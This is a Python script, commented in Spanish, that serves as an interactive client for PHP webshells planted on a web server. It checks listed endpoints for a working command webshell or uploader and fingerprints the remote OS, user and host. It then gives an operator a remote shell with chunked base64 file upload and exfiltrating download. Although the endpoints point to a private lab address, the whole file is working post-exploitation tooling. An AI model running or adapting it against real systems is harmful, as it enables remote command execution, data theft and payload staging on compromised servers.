import requests
import urllib.parse
import sys
import os
import shlex
import base64

# Códigos de color ANSI para la terminal
VERDE = "\033[92m"
AZUL = "\033[94m"
ROJO = "\033[91m"
AMARILLO = "\033[93m"
RESET = "\033[0m"

# Configuración de autocompletado nativo (Solo funciona en Linux/macOS)
try:
    import readline
    HAS_READLINE = True
except ImportError:
    HAS_READLINE = False


class RemoteShell:
    def __init__(self, endpoints):
        self.endpoints = endpoints
        self.url_shell = None
        self.os_type = "Windows"  # Valor por defecto
        self.usuario = "user"
        self.ruta_actual = "C:\\" if self.os_type == "Windows" else "/"
        self.encoding = "utf-8"

    def escanear_y_clasificar(self):
        """Recorre las rutas y detecta la primera webshell funcional."""
        print("[*] Iniciando análisis dinámico de comportamiento PHP...\n")
        webshells_encontradas = []
        uploaders_encontrados = []
        
        for url in self.endpoints:
            try:
                token_prueba = "VERIFY_SHELL_OK"
                cmd_codificado = urllib.parse.quote(f"echo {token_prueba}")
                respuesta_get = requests.get(f"{url}?cmd={cmd_codificado}", timeout=3)
                
                if respuesta_get.status_code == 200 and token_prueba in respuesta_get.text:
                    print(f"{VERDE}[+] Webshell Confirmada:{RESET} {url}")
                    webshells_encontradas.append(url)
                    continue
                    
                archivo_simulado = {'file': ('check.txt', 'ping')}
                respuesta_post = requests.post(url, files=archivo_simulado, timeout=3)
                if respuesta_post.status_code == 200 and "OK" in respuesta_post.text:
                    print(f"{AZUL}[+] Uploader Confirmado:{RESET} {url}")
                    uploaders_encontrados.append(url)
                else:
                    if respuesta_get.status_code == 200:
                        print(f"{AMARILLO}[!] Archivo activo pero sin comportamiento:{RESET} {url}")
                    else:
                        print(f"{ROJO}[-] Inaccesible (HTTP {respuesta_get.status_code}):{RESET} {url}")
            except requests.exceptions.RequestException:
                print(f"{ROJO}[-] Error de red / Timeout:{RESET} {url}")
                
        print("\n" + "="*60)
        print(" RESUMEN DE DISPONIBILIDAD")
        print("="*60)
        print(f" Webshells operativas (GET/system): {VERDE}{len(webshells_encontradas)}{RESET}")
        print(f" Uploaders operativos (POST/move): {AZUL}{len(uploaders_encontrados)}{RESET}")
        print("="*60 + "\n")
        
        if webshells_encontradas:
            self.url_shell = webshells_encontradas[0]
            return True
        return False

    def ejecutar_comando(self, comando):
        """Envía comandos normales devolviendo texto plano de forma segura y maneja codificaciones."""
        if not self.url_shell:
            return None
        try:
            comando_codificado = urllib.parse.quote(comando)
            respuesta = requests.get(f"{self.url_shell}?cmd={comando_codificado}", timeout=30)
            if respuesta.status_code == 200:
                # Intenta decodificar de forma tolerante a errores para evitar excepciones
                try:
                    return respuesta.content.decode(self.encoding, errors='replace').strip()
                except Exception:
                    return respuesta.content.decode('cp1252', errors='replace').strip()
            return None
        except requests.exceptions.RequestException:
            return None

    def detect_os_and_encoding(self):
        """Detecta automáticamente el Sistema Operativo y ajusta el encoding."""
        print("[*] Detectando sistema operativo remoto...")
        
        # Prueba con comando exclusivo de Windows
        res_win = self.ejecutar_comando("cmd.exe /c echo %OS%")
        if res_win and "Windows" in res_win:
            self.os_type = "Windows"
            # Detecta la página de códigos activa para ajustar el encoding (ej: cp850, cp1252)
            codepage = self.ejecutar_comando("chcp")
            if codepage and ":" in codepage:
                cp_num = codepage.split(":")[-1].strip()
                self.encoding = f"cp{cp_num}"
            else:
                self.encoding = "cp1252"
        else:
            # Si falla Windows, probamos comando clásico Linux
            res_linux = self.ejecutar_comando("uname -s")
            if res_linux and "Linux" in res_linux:
                self.os_type = "Linux"
                self.encoding = "utf-8"
            else:
                # Fallback por si la shell es muy restrictiva
                self.os_type = "Linux" if "/" in (self.ejecutar_comando("pwd") or "") else "Windows"
                self.encoding = "utf-8" if self.os_type == "Linux" else "cp1252"
                
        self.usuario = self.ejecutar_comando("whoami") or "user"
        self.ruta_actual = self.ejecutar_comando("cd" if self.os_type == "Windows" else "pwd") or ("C:\\" if self.os_type == "Windows" else "/")

    def mostrar_banner_host(self):
        """Muestra un banner detallado con información recolectada del host objetivo."""
        print("="*60)
        print(f" OS........... {self.os_type}")
        print(f" User......... {self.usuario}")
        print(f" Encoding..... {self.encoding}")
        
        if self.os_type == "Windows":
            hostname = self.ejecutar_comando("hostname") or "Desconocido"
            arch = self.ejecutar_comando("powershell -Command \"[Environment]::Is64BitOperatingSystem\"")
            arch_str = "x64" if "True" in (arch or "") else "x86"
            php_v = self.ejecutar_comando("php -v")
            php_v = php_v.split("\n")[0] if php_v else "Desconocido"
            print(f" Hostname..... {hostname}")
            print(f" Architecture. {arch_str}")
            print(f" PHP.......... {php_v}")
        else:
            hostname = self.ejecutar_comando("uname -n") or "Desconocido"
            arch_str = self.ejecutar_comando("uname -m") or "Desconocido"
            php_v = self.ejecutar_comando("php -v")
            php_v = php_v.split("\n")[0] if php_v else "Desconocido"
            print(f" Hostname..... {hostname}")
            print(f" Architecture. {arch_str}")
            print(f" PHP.......... {php_v}")
        print("="*60 + "\n")

    def cd(self, nueva_ruta):
        """Cambia el directorio de trabajo respetando la sintaxis del Sistema Operativo."""
        if self.os_type == "Windows":
            resultado = self.ejecutar_comando(f"cd /d \"{self.ruta_actual}\" && cd /d \"{nueva_ruta}\" && cd")
            if resultado and "El sistema no puede encontrar" not in resultado:
                self.ruta_actual = resultado
            else:
                print(f"\n[!] Ruta no encontrada: '{nueva_ruta}'\n")
        else:
            resultado = self.ejecutar_comando(f"cd {self.ruta_actual} && cd {nueva_ruta} && pwd")
            if resultado and "No such file" not in resultado:
                self.ruta_actual = resultado
            else:
                print(f"\n[!] Ruta no encontrada: '{nueva_ruta}'\n")

    def bajar_archivo(self, ruta_remota, ruta_local):
        """Descarga binarios puros usando PowerShell en Windows o Base64/dd en Linux."""
        print(f"[*] Descargando '{ruta_remota}' -> '{ruta_local}'...")
        
        if self.os_type == "Windows":
            cmd_size = f'powershell -Command "(Get-Item \'{ruta_remota}\').Length"'
        else:
            cmd_size = f"stat -c%s '{ruta_remota}'"
            
        size_str = self.ejecutar_comando(cmd_size)
        try:
            total_bytes = int(size_str)
            print(f"[*] Tamaño detectado: {total_bytes / (1024*1024):.2f} MB")
        except (ValueError, TypeError):
            print("[!] Error: No se pudo determinar el tamaño del archivo remoto.")
            return

        tamano_bloque = 1024 * 1024
        offset = 0
        
        try:
            with open(ruta_local, "wb") as f_local:
                while offset < total_bytes:
                    if self.os_type == "Windows":
                        comando = (
                            f"powershell -Command \""
                            f"$stream = [System.IO.File]::OpenRead(\'{ruta_remota}\'); "
                            f"[void]$stream.Seek({offset}, [System.IO.SeekOrigin]::Begin); "
                            f"$bytes = New-Object byte[] {min(tamano_bloque, total_bytes - offset)}; "
                            f"[void]$stream.Read($bytes, 0, $bytes.Length); "
                            f"[Convert]::ToBase64String($bytes); "
                            f"$stream.Close();\""
                        )
                    else:
                        # Fragmentación multiplataforma Linux nativa mediante dd + base64
                        comando = f"dd if='{ruta_remota}' bs=1 skip={offset} count={min(tamano_bloque, total_bytes - offset)} 2>/dev/null | base64 | tr -d '\\n'"
                    
                    comando_codificado = urllib.parse.quote(comando)
                    res = requests.get(f"{self.url_shell}?cmd={comando_codificado}", timeout=30)
                    
                    if res.status_code != 200 or not res.text:
                        print(f"\n[!] Error crítico en el fragmento en la posición {offset}.")
                        break
                        
                    datos_binarios = base64.b64decode(res.text.strip().replace("\r", "").replace("\n", ""))
                    f_local.write(datos_binarios)
                    offset += len(datos_binarios)
                    print(f"\r[+] Descargando: {(offset / total_bytes) * 100:.2f}% ({offset / (1024*1024):.2f} MB)", end="", flush=True)
            print("\n[+] Descarga completada con éxito.")
        except Exception as e:
            print(f"\n[!] Error durante la descarga: {e}")
    def subir_archivo(self, ruta_local, ruta_remota):
        """Sube binarios grandes fragmentados de forma compatible con Windows y Linux."""
        if not os.path.exists(ruta_local):
            print(f"[!] El archivo local '{ruta_local}' no existe.")
            return
            
        total_bytes = os.path.getsize(ruta_local)
        print(f"[*] Subiendo '{ruta_local}' -> '{ruta_remota}' ({total_bytes / (1024*1024):.2f} MB)...")
        
        # Limpieza previa según entorno
        if self.os_type == "Windows":
            self.ejecutar_comando(f"powershell -Command \"if (Test-Path \'{ruta_remota}\') {{ Remove-Item \'{ruta_remota}\' }}\"")
        else:
            self.ejecutar_comando(f"rm -f '{ruta_remota}'")
            
        tamano_bloque = 1024 * 1024
        offset = 0
        
        try:
            with open(ruta_local, "rb") as f_local:
                while offset < total_bytes:
                    bloque = f_local.read(tamano_bloque)
                    if not bloque:
                        break
                    contenido_b64 = base64.b64encode(bloque).decode('utf-8')
                    
                    if self.os_type == "Windows":
                        comando = (
                            f"powershell -Command \""
                            f"$b = [System.Convert]::FromBase64String(\'{contenido_b64}\'); "
                            f"[System.IO.File]::AppendAllBytes(\'{ruta_remota}\', $b);\""
                        )
                    else:
                        # Reensamblado incremental usando echo + base64 append en Linux
                        comando = f"echo '{contenido_b64}' | base64 -d >> '{ruta_remota}'"
                        
                    comando_codificado = urllib.parse.quote(comando)
                    requests.get(f"{self.url_shell}?cmd={comando_codificado}", timeout=30)
                    
                    offset += len(bloque)
                    print(f"\r[+] Subiendo: {(offset / total_bytes) * 100:.2f}% ({offset / (1024*1024):.2f} MB)", end="", flush=True)
            print("\n[+] Archivo subido y ensamblado correctamente.")
        except Exception as e:
            print(f"\n[!] Error durante la subida: {e}")


def iniciar_autocompletado():
    """Configura las palabras clave del menú interactivo para la tabulación."""
    if HAS_READLINE:
        comandos_validos = ['upload', 'download', 'exit', 'clear', 'cls', 'cd']
        def completador(text, state):
            opciones = [c for c in comandos_validos if c.startswith(text)]
            if state < len(opciones):
                return opciones[state]
            return None
        readline.parse_and_bind("tab: complete")
        readline.set_completer(completador)


def main():
    # Recuerda ingresar los endpoints completos de tu laboratorio
    endpoints = [
      "http://192.168.20.10:8000/path/uploader.php",
      "http://192.168.20.10:8000/path/shell.php"
    ]
    
    print("\n" + "="*60)
    print(" WEBSHELL INTERACTIVA MODULAR ORIENTADA A OBJETOS")
    print("="*60)
    
    shell = RemoteShell(endpoints)
    if not shell.escanear_y_clasificar():
        print(f"{ROJO}[!] Error: No se encontró ninguna Webshell interactiva funcional.{RESET}")
        sys.exit(1)
        
    print(f"[*] Canal interactivo establecido en: {VERDE}{shell.url_shell}{RESET}")
    
    # Ejecuta módulos de automatización y auditoría interna
    shell.detect_os_and_encoding()
    shell.mostrar_banner_host()
    iniciar_autocompletado()
    
    print("[*] Comandos especiales locales:")
    print(" -> upload \"<archivo_local>\" \"<nombre_remoto>\"")
    print(" -> download \"<archivo_remoto>\" \"<nombre_local>\"")
    print(" -> exit / clear")
    print("    >> Uso de los uploaders")
    print('''
    -> curl -F "file=@/ruta/de/tu/archivo/local" http://192.168.20.10:8000/path/shell.php
    
''')
    print("-" * 60)

    while True:
        try:
            prompt = f"({shell.usuario}) {shell.ruta_actual}> "
            entrada = input(prompt).strip()
            
            if not entrada:
                continue
                
            try:
                partes = shlex.split(entrada)
            except ValueError:
                partes = entrada.split(" ")
                
            comando_principal = partes[0].lower()
            
            if comando_principal == 'exit':
                print("[*] Cerrando sesión...")
                break
                
            if comando_principal in ['clear', 'cls']:
                print("\033[H\033[2J", end="")
                continue
                
            if comando_principal == "upload":
                if len(partes) >= 3:
                    shell.subir_archivo(partes[1], partes[2])
                else:
                    print("[!] Uso: upload \"<archivo_local>\" \"<ruta_remota>\"")
                continue
                
            if comando_principal == "download":
                if len(partes) >= 3:
                    shell.bajar_archivo(partes[1], partes[2])
                else:
                    print("[!] Uso: download \"<ruta_remota>\" \"<archivo_local>\"")
                continue
                
            if comando_principal == "cd":
                if len(partes) >= 2:
                    shell.cd(partes[1])
                else:
                    print(f"\n{shell.ruta_actual}\n")
                continue
                
            # Ejecución ordinaria de comandos del sistema operativo de destino
            if shell.os_type == "Windows":
                salida = shell.ejecutar_comando(f"cd /d \"{shell.ruta_actual}\" && {entrada}")
            else:
                salida = shell.ejecutar_comando(f"cd {shell.ruta_actual} && {entrada}")
                
            if salida:
                print(f"\n{salida}\n")
                
        except KeyboardInterrupt:
            print("\n\n[*] Saliendo de forma segura...")
            break

if __name__ == "__main__":
    main()
